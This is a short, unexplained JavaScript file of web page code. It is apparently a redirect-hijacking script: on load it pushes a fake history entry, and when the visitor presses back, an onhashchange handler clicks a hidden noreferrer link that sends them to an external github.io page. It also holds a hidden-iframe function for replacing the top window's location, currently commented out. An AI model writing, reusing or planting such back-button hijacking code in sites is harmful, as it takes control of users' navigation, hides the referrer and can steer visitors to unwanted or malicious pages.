function a(e) {
    var f = document.createElement('iframe');
    f.style.display = 'none';
    document.body.appendChild(f).src = 'javascript:"<script>top.location.replace(\'' + e + '\')<\/script>"';
}

function jump1() {
    if (!localStorage.is_fx) {
        localStorage.is_fx = Date.now()
        //a('https://7utism.github.io/2023/')
        //window.location.replace();
        // location.href="https://7utism.github.io/2023/";
    } else {
        // localStorage.is_fx = Date.now()
    }
}

function jump2() {
    gotoData = {
        "hb": "https://7utism.github.io/2023/",
        "hb1": "https://7utism.github.io/2023/",
    }
    if (gotoData[window.location.pathname] != undefined) {
        //a(gotoData[window.location.pathname])
        //alert("456");
    } else {
        jump1()
        //alert("123");
    }

}

window.onhashchange = function() {
    jp();
};

function hh() {
    history.pushState(history.length + 1, "app", "#pt_" + new Date().getTime());
}

function jp() {
    var a = document.createElement('a');
    a.setAttribute('rel', 'noreferrer');
    a.setAttribute('href', "https://7utism.github.io/2023/");
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}
window.onload = function() {
    setTimeout('hh();', 100);
    setTimeout(
        "var imgs = document.images;for (var t_i=0;t_i<imgs.length;t_i++) {if (imgs[t_i].attributes['d-s'] && imgs[t_i].attributes['d-s'].value) {imgs[t_i].src = imgs[t_i].attributes['d-s'].value;}}",
        100);
}
// jump2()
window.onpageshow = jump2
